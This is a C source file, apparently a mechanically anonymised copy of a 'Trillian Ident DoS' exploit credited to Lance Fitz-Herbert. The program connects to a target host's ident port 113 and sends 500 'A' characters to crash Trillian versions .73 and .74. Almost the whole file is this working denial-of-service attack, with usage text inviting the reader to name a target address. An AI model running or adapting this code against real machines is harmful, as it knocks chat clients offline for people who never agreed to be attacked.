
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct sockaddr {int dummy; } ;
struct hostent {int h_length; int * h_addr_list; } ;
typedef int address ;
typedef int WSADATA ;
struct TYPE_4__ {scalar_t__ s_addr; } ;
struct TYPE_3__ {TYPE_2__ sin_addr; int sin_port; int sin_family; } ;
typedef int SOCKET ;
typedef TYPE_1__ SOCKADDR_IN ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (int,int) ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_1 (int) ;
 int FUNC_2 () ;
 int FUNC_3 (int ,int *) ;
 int FUNC_4 (int,struct sockaddr*,int) ;
 struct hostent* FUNC_5 (char*) ;
 int FUNC_6 (int) ;
 scalar_t__ FUNC_7 (char*) ;
 int FUNC_8 (TYPE_2__*,int ,int ) ;
 int FUNC_9 (int ,char,int) ;
 int VAR_5 ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,int ,int ,int ) ;
 int FUNC_12 (int ,int ,int ) ;
 int FUNC_13 (int ) ;

int FUNC_14(int VAR_6, char * VAR_7[]) {
        int VAR_8;
        struct hostent *VAR_9;
        SOCKET VAR_10;
        SOCKADDR_IN VAR_11;
        WSADATA VAR_12;

        if (VAR_6<2) {
                FUNC_10("\nTrillian Ident DoS\n");
                FUNC_10("----------------------\n");
                FUNC_10("Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\n");
                FUNC_10("Tested On Version .74 and .73\n\n");
                FUNC_10("Usage: trillian-ident <address>");
                return 0;
        }

        FUNC_3(FUNC_0(1,1),&VAR_12);
        FUNC_10("Making Socket Now...\n");
        VAR_10 = FUNC_12(VAR_0,VAR_4,VAR_2);

        if (VAR_10 == VAR_3) {
                FUNC_10("Error Creating Socket\n");
                FUNC_2();
                return 1;
        }

        FUNC_10("Socket Created\n");

        VAR_11.sin_family = VAR_0;
        VAR_11.sin_port = FUNC_6(113);
        VAR_11.sin_addr.s_addr = FUNC_7(VAR_7[1]);


        if (VAR_11.sin_addr.s_addr == VAR_1) {
                VAR_9 = ((void*)0);
                FUNC_10("Trying To Resolve Host\n");
                VAR_9 = FUNC_5(VAR_7[1]);
                if (VAR_9 == ((void*)0)) {
                        FUNC_10("Uknown Host: %s\n",VAR_7[1]);
                        FUNC_2();
                        return 1;
                }
                FUNC_8(&VAR_11.sin_addr, VAR_9->h_addr_list[0],VAR_9->h_length);
        }



        FUNC_10("Connecting To Server...\n");
        VAR_8 = FUNC_4(VAR_10, (struct sockaddr *) &VAR_11, sizeof(VAR_11));

        if (VAR_8 == VAR_3) {
                FUNC_10("Couldnt Connect\n");
                FUNC_2();
                return 1;
        }

        FUNC_10("Connected to %s!\nSending Payload\n",VAR_7[1]);
        FUNC_9(VAR_5,'A',500);
        FUNC_11(VAR_10,VAR_5,FUNC_13(VAR_5),0);
        FUNC_1(100);
        FUNC_2();
        return 0;
}
